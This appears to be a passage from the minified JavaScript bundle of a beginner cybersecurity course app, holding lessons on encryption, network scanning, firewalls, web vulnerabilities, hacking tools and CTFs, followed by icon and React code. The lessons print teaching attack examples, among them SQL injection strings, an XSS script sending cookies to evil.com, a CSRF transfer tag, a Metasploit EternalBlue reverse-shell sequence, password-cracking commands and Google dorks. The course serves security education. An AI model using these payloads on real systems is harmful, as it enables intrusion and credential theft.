  1. Alice encrypts with Bob's PUBLIC key
  2. Only Bob's PRIVATE key can decrypt it!
\`\`\`

\`\`\`
Alice: "Hey Bob!" 
  → Encrypt with Bob's 🔑 Public Key
  → "x8k2m9p..."
  → Send to Bob

Bob receives: "x8k2m9p..."
  → Decrypt with 🗝️ Private Key  
  → "Hey Bob!"

Hacker intercepts: "x8k2m9p..."
  → Has no private key
  → Can't decrypt! 🔒
\`\`\`

### Real-World Uses

| Where | Encryption Used |
|-------|----------------|
| HTTPS websites | TLS (asymmetric + symmetric) |
| WhatsApp | Signal Protocol (end-to-end) |
| Bitcoin | Elliptic Curve Cryptography |
| Wi-Fi (WPA3) | AES encryption |
| File storage | AES-256 |

<tip>
💡 When you see HTTPS, your browser and the server did an asymmetric key exchange, then switched to faster symmetric encryption for the actual data!
</tip>

### Hashing vs Encryption

\`\`\`
Encryption: Plaintext ←→ Ciphertext (reversible!)
Hashing:    Plaintext  →  Hash      (one-way only!)
\`\`\`

Hashing is used for passwords — the website never needs to get your password back, just check if it matches!

Understanding encryption is understanding the backbone of internet security! 🔐
          `},{id:"4-2",title:"HTTPS & Secure Communication",duration:"10 min",content:`
## How HTTPS Keeps You Safe 🔒

Every time you visit a website with 🔒, encryption is protecting you!

### The TLS Handshake

When you visit https://google.com:

\`\`\`
1. YOUR BROWSER → "Hello! I want a secure connection"
2. GOOGLE → "Here's my certificate + public key" 📜
3. YOUR BROWSER → Verifies certificate is legit
4. YOUR BROWSER → Generates a session key
5. YOUR BROWSER → Encrypts session key with Google's 
                  public key, sends it
6. GOOGLE → Decrypts with private key
7. BOTH → Now share the same session key!
8. ALL DATA → Encrypted with session key 🔒
\`\`\`

### Certificates — Proof of Identity

A certificate says: "I am really google.com"

\`\`\`
Certificate for: google.com
Issued by: Google Trust Services (CA)
Valid: Jan 2024 - Apr 2024
Public Key: [included]
Signature: [CA signed this]
\`\`\`

**Certificate Authorities (CAs)** are trusted organizations that verify identities. Your browser comes with a list of trusted CAs.

### What Happens Without HTTPS

On public Wi-Fi with HTTP:

\`\`\`
You → "My password is hunter2" → Wi-Fi → Website
                                   ↑
                              Hacker sees:
                         "My password is hunter2" 😱

With HTTPS:
You → "x8k2m9p4..." → Wi-Fi → Website
                         ↑
                    Hacker sees:
                  "x8k2m9p4..." 🤷
\`\`\`

### Man-in-the-Middle (MITM) Attack

\`\`\`
Normal:
You ←──────────→ Google

MITM Attack:
You ←────→ Hacker ←────→ Google
           (reads everything!)
\`\`\`

HTTPS prevents this because the hacker can't forge Google's certificate!

### Check a Site's Certificate

Click the 🔒 in your browser:
1. See who issued the certificate
2. Check if it's valid
3. View the encryption details

\`\`\`bash
# Check certificate from terminal
openssl s_client -connect google.com:443 -brief

# See certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text
\`\`\`

### End-to-End Encryption (E2EE)

Apps like Signal and WhatsApp use E2EE:

\`\`\`
Regular encryption:
You → [Encrypted] → Server [DECRYPTED] → [Encrypted] → Friend
                     Server can read! 😰

End-to-End encryption:
You → [Encrypted] → Server [still encrypted] → Friend
                     Server can't read! ✅
\`\`\`

Only you and the recipient have the keys!

### VPNs — Your Encrypted Tunnel

\`\`\`
Without VPN:
You → ISP (sees everything) → Internet
      Your ISP knows every site you visit!

With VPN:
You → [Encrypted Tunnel] → VPN Server → Internet
      ISP sees only encrypted data!
      But... VPN server sees your traffic
\`\`\`

<warning>
⚠️ VPNs move trust, not remove it. You're trusting the VPN provider instead of your ISP. Choose carefully!
</warning>

<tip>
💡 Free VPNs often sell your data. If you're not paying, YOU are the product!
</tip>

Now you understand how encryption protects your data online! 🛡️
          `}]},{id:5,title:"Network Security",description:"Defend and analyze networks",lessons:[{id:"5-1",title:"Network Scanning & Reconnaissance",duration:"14 min",content:`
## Seeing What's on Your Network 🔍

Before you can defend a network, you need to know what's on it!

### What is Reconnaissance?

The first step in both hacking AND defending:
1. **What devices are connected?**
2. **What ports are open?**
3. **What services are running?**

### Nmap — The Network Scanner

**Nmap** is the most famous security scanning tool:

\`\`\`bash
# Scan your local network (find all devices)
nmap -sn 192.168.1.0/24

# Output:
# Host is up: 192.168.1.1    (Router)
# Host is up: 192.168.1.100  (Your PC)
# Host is up: 192.168.1.101  (Phone)
# Host is up: 192.168.1.105  (Smart TV)
\`\`\`

### Port Scanning

\`\`\`bash
# Scan a specific device for open ports
nmap 192.168.1.1

# Output:
# PORT    STATE  SERVICE
# 22/tcp  open   ssh
# 80/tcp  open   http
# 443/tcp open   https
# 8080/tcp open  http-proxy
\`\`\`

### Understanding Port States

| State | Meaning |
|-------|---------|
| **open** | Service is listening (accessible!) |
| **closed** | Port exists but no service |
| **filtered** | Firewall is blocking the scan |

### Wireshark — See ALL Network Traffic

**Wireshark** captures and displays every packet on your network:

\`\`\`
No. | Time    | Source          | Dest            | Protocol | Info
1   | 0.000   | 192.168.1.100  | 142.250.80.46  | TCP      | SYN
2   | 0.012   | 142.250.80.46  | 192.168.1.100  | TCP      | SYN-ACK
3   | 0.013   | 192.168.1.100  | 142.250.80.46  | TCP      | ACK
4   | 0.014   | 192.168.1.100  | 142.250.80.46  | TLS      | Client Hello
\`\`\`

### What You Can See in Wireshark

\`\`\`
✅ DNS queries (what sites devices visit)
✅ Unencrypted HTTP traffic
✅ Connection patterns
✅ Suspicious traffic
❌ HTTPS content (encrypted!)
❌ VPN traffic content
\`\`\`

### Netstat — Check Your Own Connections

\`\`\`bash
# See all active connections on your computer
netstat -an

# Windows: see which programs have connections
netstat -ab

# Mac/Linux: with process IDs
netstat -tulpn
# or
ss -tulpn
\`\`\`

<tip>
💡 If you see connections to IPs you don't recognize, it could be malware phoning home!
</tip>

### DNS Lookup Tools

\`\`\`bash
# Find IP of a domain
nslookup example.com

# Detailed DNS info
dig example.com

# Reverse lookup (IP → domain)
nslookup 8.8.8.8
# Result: dns.google
\`\`\`

### Traceroute — Follow the Path

See every router between you and a destination:

\`\`\`bash
# Mac/Linux
traceroute google.com

# Windows
tracert google.com

# Output:
# 1  192.168.1.1      (your router)
# 2  10.0.0.1         (ISP)
# 3  72.14.215.85     (backbone)
# 4  142.250.80.46    (Google!)
\`\`\`

### Practice: Scan Your Home Network

\`\`\`bash
# 1. Find your IP
ifconfig  # or ipconfig on Windows

# 2. Scan your network
nmap -sn 192.168.1.0/24

# 3. Count devices - do you recognize them all?
# Unknown devices = potential security issue!
\`\`\`

<warning>
⚠️ Only scan networks you OWN or have permission to scan. Scanning others' networks can be illegal!
</warning>

Knowing your network is the first step to defending it! 🔍
          `},{id:"5-2",title:"Firewalls & Defense",duration:"10 min",content:`
## Building Your Fortress 🏰

Now that you can see what's on a network, let's protect it!

### What is a Firewall?

A firewall is a gatekeeper that decides what traffic gets in and out:

\`\`\`
Internet → [FIREWALL] → Your Network
                ↓
        Rules decide:
        ✅ Allow web traffic (80, 443)
        ✅ Allow email (25, 587)
        ❌ Block everything else
\`\`\`

### Firewall Rules

Rules follow this format:
\`\`\`
ACTION  DIRECTION  PROTOCOL  PORT  SOURCE/DEST

ALLOW   INBOUND    TCP       443   Any → Server
ALLOW   OUTBOUND   TCP       80    Server → Any  
DENY    INBOUND    TCP       22    Any → Server
DENY    INBOUND    ALL       ALL   Any → Any (default)
\`\`\`

### Linux Firewall (iptables/ufw)

\`\`\`bash
# UFW (Uncomplicated Firewall) - easy mode!

# Enable firewall
sudo ufw enable

# Allow web server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH from specific IP only
sudo ufw allow from 192.168.1.100 to any port 22

# Block everything else (default)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check rules
sudo ufw status
\`\`\`

### Windows Firewall

\`\`\`
Settings → Windows Security → Firewall
- Domain networks: ON
- Private networks: ON
- Public networks: ON (most restrictive!)
\`\`\`

### Types of Firewalls

| Type | What It Does |
|------|-------------|
| **Packet Filter** | Checks each packet against rules |
| **Stateful** | Tracks connection states |
| **Application** | Understands HTTP, DNS, etc. |
| **Next-Gen (NGFW)** | Deep inspection + AI |

### Intrusion Detection (IDS) vs Prevention (IPS)

\`\`\`
IDS: "Hey, I saw something suspicious!" (alerts only)
IPS: "Suspicious traffic BLOCKED!" (takes action)
\`\`\`

### Network Segmentation

Don't put everything on one network!

\`\`\`
BAD (flat network):
[Server] - [PC] - [Smart TV] - [IoT Camera]
  ↑ If one gets hacked, hacker has access to ALL

GOOD (segmented):
[Server VLAN] | [Office VLAN] | [IoT VLAN]
  ↑ Hacked IoT camera can't reach the server!
\`\`\`

### Wi-Fi Security

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | ❌ Broken | Never use |
| WPA | ⚠️ Weak | Avoid |
| WPA2 | ✅ Good | Current standard |
| WPA3 | ✅✅ Best | Use if available |

\`\`\`
Your Wi-Fi Checklist:
☐ WPA2 or WPA3 enabled
☐ Strong password (not "password123")
☐ Default router admin password changed
☐ WPS disabled (it's hackable!)
☐ Guest network for visitors
☐ Router firmware up to date
\`\`\`

<tip>
💡 Your router's admin page is usually at 192.168.1.1 or 192.168.0.1 — log in and check your security settings!
</tip>

### Defense in Depth

Don't rely on just one defense:

\`\`\`
Layer 1: Firewall (network perimeter)
Layer 2: Antivirus (endpoint protection)
Layer 3: Updates/Patches (close vulnerabilities)
Layer 4: Strong passwords + 2FA (access control)
Layer 5: Training (human awareness)
Layer 6: Backups (recovery plan)
\`\`\`

Multiple layers = much harder to hack! 🏰
          `}]},{id:6,title:"Web Security",description:"How websites get hacked",lessons:[{id:"6-1",title:"Common Web Vulnerabilities",duration:"14 min",content:`
## How Websites Get Hacked 🌐

Websites are one of the biggest attack targets. Let's learn how they break!

### SQL Injection (SQLi)

The #1 web vulnerability for decades!

Normal login:
\`\`\`sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
\`\`\`

Hacker enters this as username:
\`\`\`
' OR '1'='1' --
\`\`\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
\`\`\`

\`'1'='1'\` is always true → Returns ALL users → Hacker is logged in! 😱

### SQL Injection - Data Theft

\`\`\`sql
-- Hacker enters in search box:
' UNION SELECT username, password FROM users --

-- Returns all usernames and passwords!
\`\`\`

### Defense Against SQLi

\`\`\`python
# BAD - Vulnerable to SQL injection!
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# GOOD - Parameterized query (safe!)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
\`\`\`

<warning>
⚠️ NEVER put user input directly into SQL queries! Always use parameterized queries.
</warning>

### Cross-Site Scripting (XSS)

Injecting JavaScript into a website:

\`\`\`html
<!-- Hacker posts this as a comment: -->
<script>
  document.location = 'https://evil.com/steal?cookie=' 
    + document.cookie;
<\/script>

<!-- When other users view the comment, 
     their cookies get stolen! -->
\`\`\`

### Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious code saved in database (comments, profiles) |
| **Reflected XSS** | Code in URL, reflected back by server |
| **DOM XSS** | Manipulates page JavaScript directly |

### Defense Against XSS

\`\`\`python
# Escape HTML special characters
import html
safe_input = html.escape(user_input)
# <script> becomes &lt;script&gt; (won't execute!)
\`\`\`

\`\`\`
Content-Security-Policy: script-src 'self'
↑ Only allow scripts from your own domain!
\`\`\`

### Cross-Site Request Forgery (CSRF)

Trick logged-in users into performing actions:

\`\`\`html
<!-- On evil website: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- Your browser sends the request WITH your 
     bank session cookie! -->
\`\`\`

Defense: **CSRF tokens** — random values that attackers can't guess.

### Insecure Direct Object References (IDOR)

\`\`\`
Your profile: https://site.com/user/profile?id=123
Change to:    https://site.com/user/profile?id=124
→ See someone else's profile! 😱
\`\`\`

Defense: Always check authorization on the server!

### The OWASP Top 10

The most critical web security risks:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

<tip>
💡 The OWASP Top 10 is updated regularly and is the gold standard for web security awareness!
</tip>

### Practice: Try Hacking (Legally!)

Safe practice environments:
- **DVWA** (Damn Vulnerable Web App)
- **HackTheBox** (online challenges)
- **TryHackMe** (guided learning)
- **PortSwigger Web Security Academy** (free!)

These are LEGAL practice environments designed to be hacked! 🎯
          `},{id:"6-2",title:"Securing Your Digital Life",duration:"10 min",content:`
## Your Personal Security Checklist ✅

Let's apply everything you've learned to protect YOUR digital life!

### Browser Security

\`\`\`
✅ Use HTTPS Everywhere (or browser's built-in)
✅ Block third-party cookies
✅ Use ad blocker (uBlock Origin)
✅ Don't save passwords in browser
   (use a password manager instead!)
✅ Keep browser updated
✅ Review extensions (remove unused ones)
\`\`\`

### Phone Security

\`\`\`
✅ Enable screen lock (PIN, fingerprint, face)
✅ Keep OS and apps updated
✅ Only install apps from official stores
✅ Review app permissions
   (Does a flashlight need your contacts? NO!)
✅ Enable "Find My Device"
✅ Encrypt your phone (usually on by default)
\`\`\`

### Social Media Security

\`\`\`
✅ Make profiles private
✅ Don't share:
   - Full birthday
   - Home address
   - School/work location in real-time
   - Vacation plans ("We're away for 2 weeks!")
✅ Review tagged photos
✅ Enable login notifications
✅ Check connected apps regularly
\`\`\`

### Email Security

\`\`\`
✅ Use unique password + 2FA
✅ Don't click links in suspicious emails
✅ Check sender address carefully
✅ Don't open unexpected attachments
✅ Use separate emails:
   - Personal email
   - Shopping/accounts email
   - Throwaway for signups
\`\`\`

### Wi-Fi Security

\`\`\`
✅ Never use public Wi-Fi for banking
✅ Use VPN on public networks
✅ Forget networks when done
✅ Don't auto-connect to open networks
✅ Use your phone hotspot instead
\`\`\`

<warning>
⚠️ Public Wi-Fi is NEVER safe! Anyone on the same network can potentially see your traffic.
</warning>

### Backup Strategy: 3-2-1 Rule

\`\`\`
3 copies of your data
2 different types of storage
1 offsite copy

Example:
1. Your computer (original)
2. External hard drive (local backup)
3. Cloud storage (offsite backup)
\`\`\`

### Software Updates

\`\`\`
Updates often fix security vulnerabilities:

"Critical security patch available"
→ Install it NOW, not later!

Auto-updates: ENABLE THEM
- Operating system
- Browser
- Phone apps
- Router firmware
\`\`\`

### If You Get Hacked

\`\`\`
1. Change passwords IMMEDIATELY
   (start with email!)
2. Enable 2FA on everything
3. Check for unauthorized access
4. Scan for malware
5. Notify affected services
6. Monitor financial accounts
7. Learn from it!
\`\`\`

<tip>
💡 Check if your email has been in a breach: haveibeenpwned.com — It's free and run by a security researcher!
</tip>

### Your Security Score

Rate yourself:
\`\`\`
[ ] Unique passwords for every account
[ ] Password manager in use
[ ] 2FA on email and banking
[ ] Phone has screen lock
[ ] Browser is up to date
[ ] Don't click suspicious links
[ ] Backups are current
[ ] Wi-Fi uses WPA2/WPA3
[ ] Social media is private

7-9: 🟢 Great security!
4-6: 🟡 Getting there
0-3: 🔴 You're at risk!
\`\`\`

Security is a journey, not a destination! 🛡️
          `}]},{id:7,title:"Ethical Hacking Tools",description:"Tools of the trade",lessons:[{id:"7-1",title:"Kali Linux & Hacking Tools",duration:"12 min",content:`
## The Hacker's Toolkit 🧰

Professional security researchers use specialized tools. Let's explore them!

### Kali Linux

The #1 operating system for ethical hacking:

\`\`\`
What: Linux distro pre-loaded with 600+ security tools
Where: kali.org (free!)
How: Run in VirtualBox or as USB boot
\`\`\`

### Setting Up Kali (In VirtualBox)

\`\`\`bash
# 1. Download VirtualBox (free)
#    virtualbox.org

# 2. Download Kali Linux VM image
#    kali.org/get-kali/

# 3. Import into VirtualBox
#    File → Import Appliance → Select .ova file

# 4. Start it up!
#    Default login: kali / kali
\`\`\`

### Essential Tools Overview

| Tool | Category | What It Does |
|------|----------|-------------|
| **Nmap** | Scanning | Network/port scanning |
| **Wireshark** | Analysis | Packet capture & analysis |
| **Burp Suite** | Web | Web app testing |
| **Metasploit** | Exploitation | Vulnerability exploitation |
| **John the Ripper** | Passwords | Password cracking |
| **Hashcat** | Passwords | GPU-accelerated cracking |
| **Aircrack-ng** | Wireless | Wi-Fi security testing |
| **Hydra** | Passwords | Online brute force |
| **SQLMap** | Web | Automated SQL injection |
| **Nikto** | Web | Web server scanner |

### Nmap Deep Dive

\`\`\`bash
# Basic scan
nmap target.com

# Scan all ports
nmap -p- target.com

# Detect operating system
nmap -O target.com

# Detect services and versions
nmap -sV target.com

# Aggressive scan (OS + services + scripts)
nmap -A target.com

# Scan for vulnerabilities
nmap --script vuln target.com
\`\`\`

### Burp Suite — Web App Testing

\`\`\`
Your Browser → [Burp Proxy] → Website
                    ↓
        See & modify EVERY request!

1. Intercept login requests
2. Modify parameters
3. Replay requests
4. Find hidden endpoints
\`\`\`

### Metasploit Framework

The exploitation Swiss army knife:

\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

<warning>
⚠️ ONLY use these tools on systems you have WRITTEN PERMISSION to test! Unauthorized use is a crime.
</warning>

### Password Cracking Tools

\`\`\`bash
# John the Ripper - crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated (much faster!)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
\`\`\`

### Practice Platforms

Safe, legal places to practice:

\`\`\`
🎯 TryHackMe.com     — Guided rooms, beginner-friendly
🎯 HackTheBox.com    — Realistic challenges
🎯 PicoCTF.org       — Student CTF competitions
🎯 OverTheWire.org   — Wargames (start with Bandit)
🎯 DVWA              — Practice web hacking locally
\`\`\`

<tip>
💡 Start with TryHackMe — it has learning paths from absolute beginner to advanced! And it's free.
</tip>

### Career Paths in Cybersecurity

| Role | What They Do | Avg Salary |
|------|-------------|-----------|
| Security Analyst | Monitor & respond to threats | $80K |
| Penetration Tester | Hack companies (legally!) | $100K |
| Security Engineer | Build secure systems | $120K |
| Bug Bounty Hunter | Find bugs for rewards | Varies ($$$) |
| CISO | Lead security strategy | $200K+ |

### Certifications to Consider

\`\`\`
Beginner:
  CompTIA Security+
  CEH (Certified Ethical Hacker)

Intermediate:
  OSCP (Offensive Security Certified Professional)
  CySA+

Advanced:
  CISSP
  OSCE
\`\`\`

You now know the tools of the trade! Use them wisely! 🛡️
          `}]},{id:8,title:"Capture The Flag",description:"Put your skills to the test",lessons:[{id:"8-1",title:"Your First CTF Challenge",duration:"15 min",content:`
## Capture The Flag! 🏁

**CTF (Capture The Flag)** competitions are how hackers test their skills!

### What is a CTF?

Teams or individuals solve security challenges to find hidden "flags":

\`\`\`
Challenge: "Find the hidden message in this website"
You hack → find → flag{y0u_f0und_th3_s3cr3t}
Submit flag → earn points! 🏆
\`\`\`

### CTF Categories

| Category | What You Do |
|----------|-------------|
| **Web** | Hack websites (XSS, SQLi, etc.) |
| **Crypto** | Break encryption |
| **Forensics** | Analyze files, memory dumps |
| **Reversing** | Reverse engineer programs |
| **Pwn** | Exploit binary programs |
| **OSINT** | Find info from public sources |
| **Misc** | Everything else! |

### Challenge 1: Decode This!

\`\`\`
Find the flag:
ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

Hint: It's Base64 encoded!

\`\`\`bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d
# Output: flag{base64_is_not_encryption}
\`\`\`

<tip>
💡 Base64 is encoding, NOT encryption! Anyone can decode it. It's used for data transport, not security.
</tip>

### Challenge 2: Hidden in Plain Sight

\`\`\`html
<!-- Look at a website's source code -->
<!-- Right-click → View Page Source -->
<!-- Or press Ctrl+U -->

<html>
<head><title>Nothing here...</title></head>
<body>
  <p>This page is empty.</p>
  <!-- flag{always_check_the_source} -->
</body>
</html>
\`\`\`

Developers sometimes leave secrets in HTML comments!

### Challenge 3: HTTP Headers

\`\`\`bash
# Check response headers
curl -I https://challenge.ctf.com

# HTTP/1.1 200 OK
# Content-Type: text/html
# X-Secret-Flag: flag{headers_hide_secrets}
# Server: nginx
\`\`\`

### Challenge 4: robots.txt

\`\`\`bash
# Websites tell search engines what NOT to index
curl https://challenge.ctf.com/robots.txt

# User-agent: *
# Disallow: /secret-admin-panel/
# Disallow: /flag.txt

# Now visit /flag.txt!
curl https://challenge.ctf.com/flag.txt
# flag{robots_txt_is_not_security}
\`\`\`

### Challenge 5: Caesar Cipher Crack

\`\`\`
Encrypted: synt{pnrfne_pvcure_vf_jrnx}
\`\`\`

\`\`\`python
# Try all 26 shifts
def caesar_crack(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if "flag" in result.lower():
            print(f"Shift {shift}: {result}")

caesar_crack("synt{pnrfne_pvcure_vf_jrnx}")
# Shift 13: flag{caesar_cipher_is_weak}
\`\`\`

This is **ROT13** — a Caesar cipher with shift of 13!

### OSINT Challenge

Find information using only public sources:

\`\`\`
Task: "What is the CEO's email at ExampleCorp?"

Sources to check:
1. Company website (About page)
2. LinkedIn profiles
3. GitHub repositories (check commits!)
4. Google dorking: "ExampleCorp" "CEO" "@"
5. WHOIS records for their domain
6. Cached pages
\`\`\`

### Google Dorking

Advanced Google searches for finding exposed data:

\`\`\`
site:example.com filetype:pdf    → PDFs on a site
intitle:"index of" passwords     → Exposed directories
inurl:admin login                → Admin pages
"password" filetype:log          → Log files with passwords
\`\`\`

<warning>
⚠️ Google dorking to find vulnerabilities in sites you don't own can be illegal. Only use on CTF challenges or with permission!
</warning>

### Where to Play CTFs

\`\`\`
🏁 PicoCTF.org          — Best for beginners!
🏁 CTFtime.org          — Calendar of CTF events
🏁 TryHackMe.com        — Guided challenges
🏁 HackTheBox.com       — Real-world scenarios
🏁 OverTheWire (Bandit)  — Linux command challenges
🏁 CryptoHack.org       — Cryptography challenges
\`\`\`

### Start Your Journey!

\`\`\`
1. Sign up on PicoCTF or TryHackMe
2. Start with the easiest challenges
3. Google when you're stuck (that's how you learn!)
4. Join a team or community
5. Practice regularly
6. Enter real CTF competitions!
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec, and ask questions!
</tip>

Congratulations! You've completed the Cybersecurity course! 🎉

You now have the foundation to:
- Protect yourself online
- Understand how attacks work
- Use security tools ethically
- Start your cybersecurity journey

Stay curious, stay ethical, and keep learning! 🛡️🚀
          `}]}]};const Md=(...z)=>z.filter((L,G,y)=>!!L&&L.trim()!==""&&y.indexOf(L)===G).join(" ").trim();const rm=z=>z.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();const dm=z=>z.replace(/^([A-Z])|[\s-_]+(\w)/g,(L,G,y)=>y?y.toUpperCase():G.toLowerCase());const Dd=z=>{const L=dm(z);return L.charAt(0).toUpperCase()+L.slice(1)};var hm={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const ym=z=>{for(const L in z)if(L.startsWith("aria-")||L==="role"||L==="title")return!0;return!1};const mm=Dt.forwardRef(({color:z="currentColor",size:L=24,strokeWidth:G=2,absoluteStrokeWidth:y,className:U="",children:K,iconNode:ue,...Ae},M)=>Dt.createElement("svg",{ref:M,...hm,width:L,height:L,stroke:z,strokeWidth:y?Number(G)*24/Number(L):G,className:Md("lucide",U),...!K&&!ym(Ae)&&{"aria-hidden":"true"},...Ae},[...ue.map(([E,P])=>Dt.createElement(E,P)),...Array.isArray(K)?K:[K]]));const At=(z,L)=>{const G=Dt.forwardRef(({className:y,...U},K)=>Dt.createElement(mm,{ref:K,iconNode:L,className:Md(`lucide-${rm(Dd(z))}`,`lucide-${z}`,y),...U}));return G.displayName=Dd(z),G};const gm=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],vm=At("book-open",gm);const pm=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],Xu=At("chevron-right",pm);const Sm=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],zn=At("circle-check",Sm);const bm=[["path",{d:"M12 6v6l4 2",key:"mmk7yg"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}]],Tm=At("clock",bm);const Am=[["path",{d:"M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8",key:"5wwlr5"}],["path",{d:"M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"r6nss1"}]],Em=At("house",Am);const zm=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]],Om=At("image",zm);const Cm=[["path",{d:"M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5",key:"1gvzjb"}],["path",{d:"M9 18h6",key:"x1upvd"}],["path",{d:"M10 22h4",key:"ceow96"}]],_m=At("lightbulb",Cm);const Dm=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],Hm=At("menu",Dm);const Nm=[["path",{d:"M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z",key:"10ikf1"}]],Mm=At("play",Nm);const xm=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Hd=At("shield",xm);const Um=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],Rm=At("triangle-alert",Um);const wm=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],jm=At("x",wm),Nd={1:{src:"/infographics/ch1-what-is-cybersecurity.jpg",alt:"What is Cybersecurity - CIA Triad & Internet Basics"},2:{src:"/infographics/ch2-passwords-authentication.jpg",alt:"Passwords & Authentication - Cracking, Rainbow Tables, 2FA"},3:{src:"/infographics/ch3-social-engineering.jpg",alt:"Social Engineering - Phishing, Vishing, Baiting, Pretexting"},4:{src:"/infographics/ch4-encryption-cryptography.jpg",alt:"Encryption & Cryptography - Symmetric, Asymmetric, HTTPS, Hashing"},5:{src:"/infographics/ch5-network-security.jpg",alt:"Network Security - Scanning, Firewalls, IDS/IPS"},6:{src:"/infographics/ch6-web-vulnerabilities.jpg",alt:"Web Vulnerabilities - SQL Injection, XSS, CSRF"},7:{src:"/infographics/ch7-ethical-hacking-tools.jpg",alt:"Ethical Hacking Toolkit - Nmap, Metasploit, Burp Suite"},8:{src:"/infographics/ch8-capture-the-flag.jpg",alt:"Capture The Flag - CTF Categories & Platforms"}};function Bm(){const[z,L]=Dt.useState(!1),[G,y]=Dt.useState("home"),[U,K]=Dt.useState(null),[ue,Ae]=Dt.useState([]);Dt.useEffect(()=>{const H=localStorage.getItem("cybersecurity-progress");H&&Ae(JSON.parse(H))},[]);const M=H=>{const R=[...ue,H];Ae(R),localStorage.setItem("cybersecurity-progress",JSON.stringify(R))},E=_t.chapters.reduce((H,R)=>H+R.lessons.length,0),P=Math.round(ue.length/E*100),j=H=>{K(H),y("lesson"),L(!1),window.scrollTo(0,0)},he=()=>{if(!U)return null;for(let H=0;H<_t.chapters.length;H++){const R=_t.chapters[H];for(let X=0;X<R.lessons.length;X++)if(R.lessons[X].id===U.id){if(X<R.lessons.length-1)return R.lessons[X+1];if(H<_t.chapters.length-1)return _t.chapters[H+1].lessons[0]}}return null},ke=()=>{if(!U)return null;for(let H=0;H<_t.chapters.length;H++){const R=_t.chapters[H];for(let X=0;X<R.lessons.length;X++)if(R.lessons[X].id===U.id){if(X>0)return R.lessons[X-1];if(H>0){const x=_t.chapters[H-1];return x.lessons[x.lessons.length-1]}}}return null},Ge=H=>{const R=H.trim().split(`
`),X=[];let x=0,Ee=!1,we=[],et="";for(;x<R.length;){const ae=R[x];if(ae.startsWith("```")){Ee?(X.push(v.jsxs("div",{className:"code-block",children:[v.jsxs("div",{className:"code-header",children:[v.jsx("span",{className:"code-language",children:et}),v.jsx("button",{className:"code-copy",onClick:()=>navigator.clipboard.writeText(we.join(`
`)),children:"Copy"})]}),v.jsx("div",{className:"code-content",children:v.jsx("pre",{children:we.join(`
